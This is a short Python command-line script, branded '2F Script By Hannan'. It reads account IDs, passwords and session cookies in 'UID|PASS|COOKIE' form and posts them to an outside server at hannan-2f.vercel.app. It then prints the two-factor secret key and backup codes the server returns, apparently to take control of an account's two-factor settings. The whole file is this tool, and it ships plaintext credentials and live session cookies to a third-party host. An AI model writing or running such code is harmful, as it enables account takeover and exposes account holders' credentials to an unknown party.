import requests as r,os
own="hannan"
while True:
  os.system("clear")
  print("\033[1;97m-"*40)
  print("\t \033[1;92m 2F Script By "+own.title())
  print("\033[1;97m-"*40)
  id,ps,cookie=input("\033[1;97m[✓] UID|PASS|COOKIE : ").split("|")
  print("\033[1;97m-"*40)
  data = {"email":id,
               "password":ps,
               "cookie":cookie
               } 
  response = r.post("https://"+own+"-2f.vercel.app/2factor",data=data).json()
  if response['Status']=="Success":
     codes=response['2FCODES']
     keys=response['2FKEY']
     print("\033[1;92m[✓] \033[1;97mSuccess")
     print("-"*40)
     print("\033[1;92m[✓] \033[1;97m"+id)
     print("\033[1;92m[✓] \033[1;97m"+ps)
     print("-"*40)
     print("\033[1;92m[✓] \033[1;97m"+keys)
     print("\033[1;97m-"*40)
     for i in codes:
         print("\033[1;92m[✓] \033[1;97m\t"+i)

  if response['Status']=="Error":
     print("\033[1;91m[×] \033[1;97mFailed")
     print("\033[1;97m-"*40)
     print("\033[1;91m[×] \033[1;97m"+id)
     print("\033[1;91m[×] \033[1;97m"+ps)
     print("\033[1;97m-"*40)
     print("\033[1;91m[×] \033[1;97m"+response["error_message"])
  print("\033[1;97m-"*40)
  input("Press Enter To Back! ")